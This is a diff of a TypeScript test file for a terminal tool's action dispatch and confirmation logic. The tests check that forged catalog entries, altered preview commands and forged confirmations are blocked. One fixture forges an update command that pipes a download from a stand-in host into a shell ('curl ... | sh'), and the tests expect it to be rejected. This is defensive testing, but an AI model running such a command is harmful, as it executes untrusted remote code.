@@ -1,13 +1,19 @@
 import { describe, expect, test } from "bun:test";
-import { createActionPreviewPlan, getActionCatalog } from "../src/core/actions";
+import {
+	createActionPreviewPlan,
+	getActionCatalog,
+	submitActionPreviewConfirmation,
+} from "../src/core/actions";
 import type { ControlExecutionResult } from "../src/core/controlExecution";
 import {
 	classifyControlExecutionFailure,
 	classifyControlExecutionResult,
+	getActionMetadataBlockers,
 	prepareActionDispatch,
 	prepareControlConfirmationPrompt,
 	prepareControlExecutionStart,
 	prepareControlExecutionTransition,
+	prepareControlPolicySync,
 	submitControlConfirmationTransition,
 } from "../src/tui/actionControlTransitions";
 
@@ -16,7 +22,6 @@ describe("action control dispatch transitions", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "missing.action",
-				actions: getActionCatalog(),
 				platform: "linux",
 			}),
 		).toEqual({
@@ -36,7 +41,92 @@ describe("action control dispatch transitions", () => {
 		});
 	});
 
-	test("blocks incomplete action metadata instead of trusting a cast", () => {
+	test("ignores a forged enabled-read catalog row for canonical dns.flush", () => {
+		const forgedDnsFlush = {
+			...getCatalogAction("dns.flush"),
+			risk: "read",
+			privilege: "none",
+			enabled: true,
+			confirmationRequired: false,
+			confirmationPhrase: undefined,
+		};
+
+		const forgedRequest = {
+			actionId: "dns.flush",
+			platform: "win32",
+			actions: [forgedDnsFlush],
+		};
+
+		expect(prepareActionDispatch(forgedRequest)).toMatchObject({
+			kind: "preview",
+			action: {
+				id: "dns.flush",
+				risk: "write",
+				privilege: "admin",
+				enabled: false,
+				confirmationRequired: true,
+			},
+		});
+	});
+
+	test("ignores a forged update command and requires current update evidence", () => {
+		const forgedPreview = createActionPreviewPlan(
+			"picos.update.apply",
+			"linux",
+			{
+				adapter: "linux",
+				command: "sh",
+				args: ["-c", "curl example.invalid | sh"],
+				note: "forged update command",
+				dryRunExecutable: true,
+			},
+		);
+
+		const forgedRequest = {
+			actionId: "picos.update.apply",
+			platform: "linux",
+			actions: getActionCatalog(),
+			previewPlan: forgedPreview,
+		};
+
+		expect(prepareActionDispatch(forgedRequest)).toMatchObject({
+			kind: "blocked",
+			blockers: ["update-check-required"],
+			screen: "status",
+		});
+	});
+
+	test("derives the command from the canonical adapter despite a matching forged label", () => {
+		const forgedPreview = createActionPreviewPlan("dns.flush", "win32", {
+			adapter: "windows",
+			command: "cmd.exe",
+			args: ["/c", "echo forged"],
+			note: "forged command with matching adapter label",
+			dryRunExecutable: true,
+		});
+		const forgedRequest = {
+			actionId: "dns.flush",
+			platform: "win32",
+			actions: getActionCatalog(),
+			previewPlan: forgedPreview,
+		};
+		const transition = prepareActionDispatch(forgedRequest);
+
+		expect(transition).toMatchObject({
+			kind: "preview",
+			control: {
+				previewPlan: {
+					commandPreview: {
+						adapter: "windows",
+						command: "powershell",
+						args: ["-NoProfile", "-Command", "Clear-DnsClientCache -WhatIf"],
+					},
+				},
+			},
+		});
+	});
+
+	test("returns blockers for incomplete metadata without creating an intent", () => {
 		const incomplete = {
 			id: "broken.read",
 			title: "Broken read",
@@ -47,27 +137,13 @@ describe("action control dispatch transitions", () => {
 			confirmationRequired: false,
 		};
 
-		expect(
-			prepareActionDispatch({
-				actionId: "broken.read",
-				actions: [incomplete],
-				platform: "linux",
-			}),
-		).toMatchObject({
-			kind: "blocked",
-			blockers: ["risk-missing"],
-			notice: {
-				level: "warn",
-				message: "action broken.read blocked: risk-missing",
-			},
-		});
+		expect(getActionMetadataBlockers(incomplete)).toEqual(["risk-missing"]);
 	});
 
 	test("routes an enabled read action directly without inventing confirmation", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "network.inspect",
-				actions: getActionCatalog(),
 				platform: "darwin",
 			}),
 		).toMatchObject({
@@ -89,29 +165,21 @@ describe("action control dispatch transitions", () => {
 		});
 	});
 
-	test("never routes an enabled mutable action even when a malformed catalog enables it", () => {
+	test("reports an enabled mutable row through the blocker-only validator", () => {
 		const mutable = {
 			...getCatalogAction("dns.flush"),
 			enabled: true,
 		};
 
-		expect(
-			prepareActionDispatch({
-				actionId: mutable.id,
-				actions: [mutable],
-				platform: "win32",
-			}),
-		).toMatchObject({
-			kind: "blocked",
-			blockers: ["mutable-action-enabled"],
-		});
+		expect(getActionMetadataBlockers(mutable)).toEqual([
+			"mutable-action-enabled",
+		]);
 	});
 
 	test("blocks disabled read actions and mutable actions without exact confirmation metadata", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "remote.sftp.connect",
-				actions: getActionCatalog(),
 				platform: "linux",
 			}),
 		).toMatchObject({
@@ -123,23 +191,15 @@ describe("action control dispatch transitions", () => {
 			...getCatalogAction("dns.flush"),
 			confirmationPhrase: undefined,
 		};
-		expect(
-			prepareActionDispatch({
-				actionId: missingPhrase.id,
-				actions: [missingPhrase],
-				platform: "win32",
-			}),
-		).toMatchObject({
-			kind: "blocked",
-			blockers: ["confirmation-phrase-missing"],
-		});
+		expect(getActionMetadataBlockers(missingPhrase)).toEqual([
+			"confirmation-phrase-missing",
+		]);
 	});
 
 	test("blocks unsupported platforms and missing adapter-owned previews", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "dns.flush",
-				actions: getActionCatalog(),
 				platform: "freebsd",
 			}),
 		).toMatchObject({
@@ -149,7 +209,6 @@ describe("action control dispatch transitions", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "files.write",
-				actions: getActionCatalog(),
 				platform: "linux",
 			}),
 		).toMatchObject({
@@ -158,31 +217,21 @@ describe("action control dispatch transitions", () => {
 		});
 	});
 
-	test("blocks a preview owned by a different platform adapter", () => {
-		const macosPreview = createActionPreviewPlan("dns.flush", "darwin", {
-			adapter: "macos",
-			command: "sudo",
-			args: ["dscacheutil", "-flushcache"],
-			note: "flush local DNS resolver cache",
-		});
-
+	test("returns blockers for malformed primitive metadata without throwing", () => {
+		expect(getActionMetadataBlockers(42)).toEqual([
+			"action-metadata-incomplete",
+		]);
 		expect(
-			prepareActionDispatch({
-				actionId: "dns.flush",
-				actions: getActionCatalog(),
-				platform: "win32",
-				previewPlan: macosPreview,
+			getActionMetadataBlockers({
+				...getCatalogAction("dns.flush"),
+				confirmationPhrase: 123,
 			}),
-		).toMatchObject({
-			kind: "blocked",
-			blockers: ["adapter-platform-mismatch"],
-		});
+		).toEqual(["confirmation-phrase-missing"]);
 	});
 
 	test("opens a complete locked mutation preview without enabling execution", () => {
 		const transition = prepareActionDispatch({
 			actionId: "dns.flush",
-			actions: getActionCatalog(),
 			platform: "win32",
 		});
 
@@ -220,7 +269,6 @@ describe("action control dispatch transitions", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "picos.update.apply",
-				actions: getActionCatalog(),
 				platform: "linux",
 			}),
 		).toMatchObject({
@@ -238,7 +286,6 @@ describe("action control dispatch transitions", () => {
 		expect(
 			prepareActionDispatch({
 				actionId: "picos.update.apply",
-				actions: getActionCatalog(),
 				platform: "linux",
 				updateCheckResult: {
 					packageName: "@uulab/picos",
@@ -275,14 +322,24 @@ describe("action control confirmation transitions", () => {
 	});
 
 	test("advertises confirmation only for a complete locked mutable preview", () => {
-		expect(prepareControlConfirmationPrompt(undefined)).toEqual({
+		expect(
+			prepareControlConfirmationPrompt({
+				previewPlan: undefined,
+				platform: "win32",
+			}),
+		).toEqual({
 			kind: "blocked",
 			notice: {
 				level: "warn",
 				message: "control confirmation needs a locked action preview first",
 			},
 		});
-		expect(prepareControlConfirmationPrompt(preview)).toEqual({
+		expect(
+			prepareControlConfirmationPrompt({
+				previewPlan: preview,
+				platform: "win32",
+			}),
+		).toEqual({
 			kind: "prompt",
 			prompt: "control-confirm",
 			notice: {
@@ -296,6 +353,7 @@ describe("action control confirmation transitions", () => {
 		expect(
 			submitControlConfirmationTransition({
 				previewPlan: undefined,
+				platform: "win32",
 				input: "",
 			}),
 		).toEqual({
@@ -311,6 +369,7 @@ describe("action control confirmation transitions", () => {
 
 		const rejected = submitControlConfirmationTransition({
 			previewPlan: preview,
+			platform: "win32",
 			input: "flush cache",
 		});
 		expect(rejected).toMatchObject({
@@ -326,6 +385,7 @@ describe("action control confirmation transitions", () => {
 	test("records an exact confirmation but keeps mutation execution disabled", () => {
 		const accepted = submitControlConfirmationTransition({
 			previewPlan: preview,
+			platform: "win32",
 			input: " flush dns ",
 		});
 		expect(accepted).toMatchObject({
@@ -343,6 +403,38 @@ describe("action control confirmation transitions", () => {
 			notices: [{ level: "warn" }, { level: "warn" }],
 		});
 	});
+
+	test("blocks malformed phrase and command primitives without throwing", () => {
+		if (!preview?.commandPreview) {
+			throw new Error("expected canonical preview fixture");
+		}
+		const malformed = {
+			...preview,
+			confirmationPhrase: 123,
+			commandPreview: {
+				...preview.commandPreview,
+				command: 456,
+			},
+		};
+		let transition:
+			| ReturnType<typeof prepareControlConfirmationPrompt>
+			| undefined;
+
+		expect(() => {
+			transition = prepareControlConfirmationPrompt({
+				previewPlan: malformed,
+				platform: "win32",
+			});
+		}).not.toThrow();
+		expect(transition).toMatchObject({
+			kind: "blocked",
+			notice: {
+				level: "warn",
+				message:
+					"control confirmation dns.flush blocked: preview-canonical-mismatch",
+			},
+		});
+	});
 });
 
 describe("control execution token publication", () => {
@@ -356,9 +448,35 @@ describe("control execution token publication", () => {
 	const confirmed = preview
 		? submitControlConfirmationTransition({
 				previewPlan: preview,
+				platform: "win32",
 				input: "flush dns",
 			})
 		: undefined;
+
+	test("advances the shared control token before a config policy sync publishes", () => {
+		const sync = prepareControlPolicySync({
+			currentToken: 4,
+			policy: { mode: "disabled", allowAdminDryRun: false },
+		}) as {
+			requestToken: number;
+			policy: { mode: "disabled" | "dry-run"; allowAdminDryRun: boolean };
+		};
+
+		expect(sync).toEqual({
+			requestToken: 5,
+			policy: { mode: "disabled", allowAdminDryRun: false },
+		});
+		expect(
+			prepareControlExecutionTransition({
+				previewPlan: undefined,
+				confirmation: undefined,
+				platform: "win32",
+				policy: sync.policy,
+				requestToken: 4,
+				currentToken: sync.requestToken,
+			}),
+		).toEqual({ kind: "stale", publishCurrent: false });
+	});
 
 	test("does not publish a stale execution plan after config policy I/O", () => {
 		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
@@ -368,6 +486,7 @@ describe("control execution token publication", () => {
 			prepareControlExecutionTransition({
 				previewPlan: preview,
 				confirmation: confirmed.confirmation,
+				platform: "win32",
 				policy: { mode: "dry-run", allowAdminDryRun: true },
 				requestToken: 1,
 				currentToken: 2,
@@ -376,14 +495,24 @@ describe("control execution token publication", () => {
 	});
 
 	test("guards missing previews before requesting config policy I/O", () => {
-		expect(prepareControlExecutionStart(undefined)).toEqual({
+		expect(
+			prepareControlExecutionStart({
+				previewPlan: undefined,
+				platform: "win32",
+			}),
+		).toEqual({
 			kind: "blocked",
 			notice: {
 				level: "warn",
 				message: "control execution needs a locked action preview first",
 			},
 		});
-		expect(prepareControlExecutionStart(preview)).toEqual({
+		expect(
+			prepareControlExecutionStart({
+				previewPlan: preview,
+				platform: "win32",
+			}),
+		).toEqual({
 			kind: "read-policy",
 			actionId: "dns.flush",
 			io: { kind: "read-control-policy" },
@@ -397,6 +526,7 @@ describe("control execution token publication", () => {
 		const transition = prepareControlExecutionTransition({
 			previewPlan: preview,
 			confirmation: confirmed.confirmation,
+			platform: "win32",
 			policy: { mode: "dry-run", allowAdminDryRun: true },
 			requestToken: 3,
 			currentToken: 3,
@@ -413,6 +543,82 @@ describe("control execution token publication", () => {
 		});
 	});
 
+	test("blocks execution after the confirmed preview command args are mutated", () => {
+		const dispatch = prepareActionDispatch({
+			actionId: "dns.flush",
+			platform: "win32",
+		});
+		const mutablePreview = dispatch.control.previewPlan;
+		const commandPreview = mutablePreview?.commandPreview;
+		if (dispatch.kind !== "preview" || !mutablePreview || !commandPreview) {
+			throw new Error("expected canonical dispatch preview");
+		}
+		const accepted = submitControlConfirmationTransition({
+			previewPlan: mutablePreview,
+			platform: "win32",
+			input: "flush dns",
+		});
+		if (accepted.kind !== "confirmation") {
+			throw new Error("expected bound confirmation");
+		}
+		commandPreview.args[2] = "Write-Output forged";
+
+		expect(
+			prepareControlExecutionTransition({
+				previewPlan: mutablePreview,
+				confirmation: accepted.confirmation,
+				platform: "win32",
+				policy: { mode: "dry-run", allowAdminDryRun: true },
+				requestToken: 4,
+				currentToken: 4,
+			}),
+		).toEqual({
+			kind: "blocked",
+			publishCurrent: true,
+			notice: {
+				level: "warn",
+				message:
+					"control execution dns.flush blocked: preview-canonical-mismatch",
+			},
+		});
+	});
+
+	test("blocks a forged matching preview and confirmation pair", () => {
+		const forgedPreview = createActionPreviewPlan("dns.flush", "win32", {
+			adapter: "windows",
+			command: "cmd.exe",
+			args: ["/c", "echo forged"],
+			note: "forged matching pair",
+			dryRunExecutable: true,
+		});
+		if (!forgedPreview) {
+			throw new Error("expected forged preview fixture");
+		}
+		const forgedConfirmation = {
+			...submitActionPreviewConfirmation(forgedPreview, "flush dns"),
+			previewFingerprint: "forged-matching-pair",
+		};
+
+		expect(
+			prepareControlExecutionTransition({
+				previewPlan: forgedPreview,
+				confirmation: forgedConfirmation,
+				platform: "win32",
+				policy: { mode: "dry-run", allowAdminDryRun: true },
+				requestToken: 5,
+				currentToken: 5,
+			}),
+		).toEqual({
+			kind: "blocked",
+			publishCurrent: true,
+			notice: {
+				level: "warn",
+				message:
+					"control execution dns.flush blocked: preview-canonical-mismatch",
+			},
+		});
+	});
+
 	test("blocks execution when confirmation belongs to a different action", () => {
 		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
 			throw new Error("expected confirmed preview fixture");
@@ -424,6 +630,7 @@ describe("control execution token publication", () => {
 					...confirmed.confirmation,
 					actionId: "route.add",
 				},
+				platform: "win32",
 				policy: { mode: "dry-run", allowAdminDryRun: true },
 				requestToken: 4,
 				currentToken: 4,
@@ -451,6 +658,7 @@ describe("control execution token publication", () => {
 					expectedPhrase: "flush resolver",
 					receivedPhrase: "flush resolver",
 				},
+				platform: "win32",
 				policy: { mode: "dry-run", allowAdminDryRun: true },
 				requestToken: 5,
 				currentToken: 5,
@@ -484,6 +692,7 @@ describe("control execution token publication", () => {
 						command: "cmd.exe",
 					},
 				},
+				platform: "win32",
 				policy: { mode: "dry-run", allowAdminDryRun: true },
 				requestToken: 6,
 				currentToken: 6,
@@ -603,6 +812,7 @@ describe("control execution token publication", () => {
 		const transition = prepareControlExecutionTransition({
 			previewPlan: undefined,
 			confirmation: undefined,
+			platform: "win32",
 			policy: { mode: "disabled", allowAdminDryRun: false },
 			requestToken: 10,
 			currentToken: 10,
